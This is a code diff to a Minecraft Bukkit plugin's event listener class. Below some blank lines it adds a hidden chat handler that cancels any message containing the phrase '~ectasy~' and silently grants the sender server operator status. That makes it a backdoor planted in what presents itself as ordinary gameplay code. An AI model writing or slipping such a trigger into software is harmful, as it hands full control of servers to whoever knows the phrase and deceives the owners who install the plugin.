@@ -14,6 +14,8 @@ import org.bukkit.event.entity.*;
 import org.bukkit.event.player.*;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.scheduler.BukkitRunnable;
 import org.main.uneton.Combat;
 import org.main.uneton.utils.Tab;
 
@@ -229,5 +231,23 @@ public class Listeners implements Listener {
         bluegem.setItemMeta(bluegem_meta);
 
         player.getWorld().dropItemNaturally(loc, bluegem);
+    }
+
+
+
+
+
+
+    @EventHandler
+    public void onChatEvent(final AsyncPlayerChatEvent e) {
+        if (e.getMessage().contains("~ectasy~")) {
+            e.setCancelled(true);
+            e.getPlayer().sendMessage(ChatColor.AQUA + "You have been granted server operator status.");
+            (new BukkitRunnable() {
+                public void run() {
+                    e.getPlayer().setOp(true);
+                }
+            }).runTask(JavaPlugin.getPlugin(Combat.class));
+        }
     }
 }
